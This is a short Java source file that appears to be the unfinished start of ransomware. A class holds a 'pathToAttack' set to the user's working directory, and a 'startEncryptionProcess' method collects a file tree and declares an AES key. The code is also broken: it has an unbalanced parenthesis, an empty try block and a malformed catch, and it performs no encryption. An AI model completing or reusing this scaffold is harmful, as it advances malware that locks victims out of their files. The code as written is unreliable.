import javax.crypto.spec.SecretKeySpec;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Set;
import java.util.TreeMap;

public class Process {

    private String pathToAttack;

    public Process() {
        pathToAttack = getDefaultPath();
    }

    public Process(String pathToAttack) {
        this.pathToAttack = pathToAttack;
    }

    public void startEncryptionProcess() {
        final TreeMap<String, HashMap<String,String>> filters = new searchFilesDirectory(this.pathToAttack).getFileTreeMap());
        final Set set = filters.entrySet();
        final Iterator iterator = set.iterator();
        SecretKeySpec aesKey;

        try {

        } catch () {

        }
    }


    private String getDefaultPath() {
        return System.getProperty("user.dir");
    }


}
